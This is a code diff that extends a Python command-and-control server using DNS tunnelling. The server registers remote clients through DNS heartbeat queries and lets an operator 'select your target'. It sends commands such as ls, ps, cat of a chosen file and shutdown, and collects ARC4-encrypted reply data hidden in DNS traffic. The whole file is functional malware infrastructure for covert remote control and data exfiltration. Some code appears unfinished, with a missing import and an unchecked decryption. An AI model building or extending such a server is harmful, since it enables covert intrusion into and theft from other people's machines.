@@ -1,5 +1,8 @@
 import datetime
-import select
+import signal
+import sys
+import threading
+from arc4 import ARC4
 from argparse import ArgumentParser
 from typing import Any, Dict
 
@@ -12,7 +15,12 @@ class Command:
     def __init__(self, addr):
         self.addr = addr
         self.completed = True
+        """ Whether this command has been completed """
+
         self.started = False
+        """ Whether the client knows we want this command to be executed. Waiting for reply """
+
+        self.arg = []
         self.segments = []
         self.command = None
 
@@ -23,6 +31,11 @@ class Command:
 
     def add_segment(self, data):
         self.segments.append(data)
+
+    def set_command(self, command, arg=None):
+        self.command = command
+        self.arg = arg
+        self.completed = False
 
 
 class Server:
@@ -37,7 +50,7 @@ class Server:
         self.commands_for_clients: Dict[Any, Command] = {}
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         self.socket.bind((self.listening_ip, self.listening_port))
-        self.socket.setblocking(False)
+        self.socket.settimeout(10)
 
         self.__log("Started listening on port: {}, ip: {}".format(self.listening_port, self.listening_ip))
         self.running = False
@@ -54,27 +67,28 @@ class Server:
         self.running = True
 
         while self.running:
-            ready = select.select([self.socket], [], [], 10)
-            if not ready:
+            try:
+                data, addr = self.socket.recvfrom(1024)
+                request = DNSRecord.parse(data)
+            except Exception:
+                self.__log("No valid input...")
                 continue
-
-            data, addr = self.socket.recvfrom(1024)
-            request = DNSRecord.parse(data)
 
             if request.get_q().get_qname().matchGlob(client_to_serv["HB"]):
                 # It is a heartbeat..
                 self.__log("{} Heartbeat".format(addr))
-
                 repl = self.heartbeat_reply(request.reply(), addr)
+
             elif request.get_q().get_qname().matchGlob(client_to_serv["response"]):
                 # It is a reply for our request:
                 self.__log("{}: We got a response for our request!".format(addr))
-
                 repl = self.extract_data_from_request(request, addr)
+
             elif request.get_q().get_qname().matchGlob(client_to_serv["done"]):
                 # The client has finished sending us data...
                 self.__log("{}: Finished request".format(addr))
                 repl = self.finished_stream(request, addr)
+
             else:
                 self.__log("{}: ERROR: Got unknown packet, that violates the protocol! Ignoring...".format(addr))
                 return
@@ -91,6 +105,10 @@ class Server:
                 "{}: Finished receiving stream for command: {}".format(addr, self.commands_for_clients[addr].command))
             command = serv_to_client["ACK"]
 
+            if not self.decrypt_segments(addr):
+                self.__log("Decrypting segments failed. Sending RST error signal")
+                command = serv_to_client["RST"]
+
         repl = request.reply()
         repl.add_answer(RR(request.get_q().get_qname(), QTYPE.A, rdata=A(command), ttl=60))
 
@@ -102,6 +120,18 @@ class Server:
         """
 
         return "".join(data.rstrip(client_to_serv["RESP"]).split('.'))
+
+    def decrypt_segments(self, addr) -> bool:
+        """
+        Attempts to decrypt segments
+        :return: Whether the decryption was successful
+        """
+
+        self.commands_for_clients[addr].segments = ARC4(self.password).decrypt(
+            b"".join(self.commands_for_clients[addr].segments))
+        # TODO: CHECK
+
+        return True
 
     def extract_data_from_request(self, request, addr):
         if addr not in self.connected_clients or not self.commands_for_clients[addr].started:
@@ -123,11 +153,12 @@ class Server:
 
     def heartbeat_reply(self, request, addr):
         new_one = addr not in self.connected_clients
-        self.connected_clients[addr] = datetime.datetime.now().timestamp()
+        self.connected_clients[addr] = datetime.datetime.now()
 
         if new_one:
             # We register a new client
-            self.commands_for_clients[new_one] = Command(addr)
+            print("New client {} registered!".format(addr))
+            self.commands_for_clients[addr] = Command(addr)
             command = serv_to_client["ACK"]
 
         elif self.commands_for_clients[addr].completed:
@@ -146,7 +177,7 @@ class Server:
 
         # Sanity check
         if command is None:
-            self.__log("{}: Cannot launch None command!".format(addr))
+            self.__log("{}: Cannot reply with None message!".format(addr))
             return
 
         reply = request.reply()
@@ -159,7 +190,9 @@ class Server:
         Removes all inactive clients from the client list
         """
         for i in self.connected_clients:
-            if abs((datetime.datetime.now() - self.connected_clients[i]).total_seconds()) > 200:
+            if abs((datetime.datetime.now() - self.connected_clients[
+                i]).total_seconds()) > 20:  # TODO: Change back to 200
+                print("Cleaning up client {} because of inactivity".format(i))
                 del self.connected_clients[i]
                 del self.commands_for_clients[i]
 
@@ -167,11 +200,91 @@ class Server:
         """
         Instruction for the Server object to get and answer a new command from the user. 
         """
-        # TODO:
 
-        command = input("y for stopping the server")
-        if command.lower() == "y":
-            self.running = False
+        for addr in self.commands_for_clients:
+            if self.commands_for_clients[addr].completed and self.commands_for_clients[addr].started and type(
+                    self.commands_for_clients[addr].segments) == str:
+                print("Reply from {} for request: {}:".format(addr, self.commands_for_clients[addr].command))
+                print(self.commands_for_clients[addr].segments)
+                self.commands_for_clients[addr].started = False
+
+        try:
+            if len(self.connected_clients) == 0:
+                print("No clients connected.")
+                time.sleep(5)
+                return
+
+            self.cleanup_connected()
+            print("\n================")
+            # Select IP to give commands to:
+            print("0: Rescan")
+            for i in range(len(self.connected_clients.keys())):
+                print("{}: {}".format(i + 1, list(self.connected_clients.keys())[i]))
+
+            selected_ip = int(input("Select your target: \n================\n"))
+            if selected_ip == 0:
+                return
+            else:
+                # Compensate for the rescan option
+                selected_ip -= 1
+            tar_addr = list(self.connected_clients.keys())[selected_ip]
+
+            print("\n================")
+            # Select command:
+            print("1: ls")
+            print("2: w")
+            print("3: ps")
+            print("4: cat")
+            print("5: nop")
+            print("6: shutdown")
+            print("7: exit")
+
+            command = int(input("Command number: \n================\n"))
+            argument = None
+
+            if command == 1:
+                command = serv_to_client["LS"]
+            elif command == 2:
+                command = serv_to_client["W"]
+            elif command == 3:
+                command = serv_to_client["PS"]
+            elif command == 4:
+                command = serv_to_client["CAT"]
+                argument = input("Enter argument: ")
+            elif command == 5:
+                return
+            elif command == 6:
+                command = serv_to_client["SD"]
+                argument = input("Enter argument: ")
+            elif command == 7:
+                self.running = False
+                return
+
+            self.commands_for_clients[tar_addr].set_command(command, argument)
+
+        except Exception as e:
+            print("Invalid input! {}".format(e), file=sys.stderr)
+
+
+class Worker:
+    def __init__(self, server: Server):
+        self.thread = threading.Thread(target=server.run, args=())
+        self.thread.daemon = True
+        self.server = server
+
+    def start(self):
+        self.thread.start()
+
+    def stop(self):
+        print("Stopping daemon...")
+        self.server.running = False
+        self.thread.join()
+
+
+def signal_handler(sig, frame, worker):
+    print('You pressed Ctrl+C!')
+    worker.stop()
+    sys.exit(0)
 
 
 if __name__ == '__main__':
@@ -181,11 +294,17 @@ if __name__ == '__main__':
     parser.add_argument("-s", "--silent", help="Hide detailed debug info", type=bool, default=False)
     parser.add_argument("-ip", "--ip", help="Server IP", type=str, default="127.0.0.1")
     parser.add_argument("-p", "--port", help="Port for the server to run on", type=int,
-                        default=51276)  # TODO: Arbitrary...
+                        default=51271)  # TODO: Arbitrary...
     args = parser.parse_args()
 
     server = Server(args)
-    server.run()
+    worker = Worker(server)
+    signal.signal(signal.SIGINT, lambda sig, frame: signal_handler(sig, frame, worker))
+
+    worker.start()
 
     while server.running:
         server.next_command()
+        time.sleep(1)
+
+    worker.stop()
